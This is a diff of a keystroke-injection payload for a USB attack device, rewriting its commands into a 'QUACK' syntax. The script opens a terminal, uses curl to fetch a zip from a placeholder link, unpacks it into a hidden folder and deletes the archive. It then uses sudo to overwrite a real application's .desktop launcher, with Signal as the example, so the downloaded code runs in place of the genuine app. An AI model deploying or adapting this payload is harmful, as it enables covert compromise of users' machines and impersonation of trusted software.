@@ -21,31 +21,31 @@
 
 
 * Open a shell
-DELAY 2000
-CTRL-ALT t
-DELAY 1000
+QUACK DELAY 2000
+QUACK CTRL-ALT t
+QUACK DELAY 1000
 
 * Set the link from wich will be downloaded the zip archive
-STRING curl -o ./arbitrary.zip "ARBITRARY_APP_LINK"
-ENTER
+QUACK STRING curl -o ./arbitrary.zip "ARBITRARY_APP_LINK"
+QUACK ENTER
 * Depends*
-DELAY 5000
+QUACK DELAY 5000
 
-STRING unzip ./arbitrary.zip -d ./.arbitrary
-ENTER
+QUACK STRING unzip ./arbitrary.zip -d ./.arbitrary
+QUACK ENTER
 * Depends*
-DELAY 2000
-STRING rm ./arbitrary.zip
-ENTER
-DELAY 1000
+QUACK DELAY 2000
+QUACK STRING rm ./arbitrary.zip
+QUACK ENTER
+QUACK DELAY 1000
 
 * You must set the desktop file path present in the zip file, if i.e. you have the app name Signal and the desktop file path is Signal/files/signal you should put the path Signal/files/signal
 * You must know the original desktop name file, if you don't know it you can rich this information download the app on you system and going to /usr/share/applications/ searching this one app, i.e. the desktop file name of Signal application is signal-desktop.desktop, so in this case you should put signal-desktop.desktop
-STRING sudo mv ./.arbitrary/PATH_TO_DESKTOP_FILE /usr/share/applications/ORIGINAL_DESKTOP_FILE_NAME
-ENTER
-DELAY 1000
+QUACK STRING sudo mv ./.arbitrary/PATH_TO_DESKTOP_FILE /usr/share/applications/ORIGINAL_DESKTOP_FILE_NAME
+QUACK ENTER
+QUACK DELAY 1000
 * sudo permissions needed
-STRING SUDO
-ENTER
-DELAY 4000
-ALT f4
+QUACK STRING SUDO
+QUACK ENTER
+QUACK DELAY 4000
+QUACK ALT f4
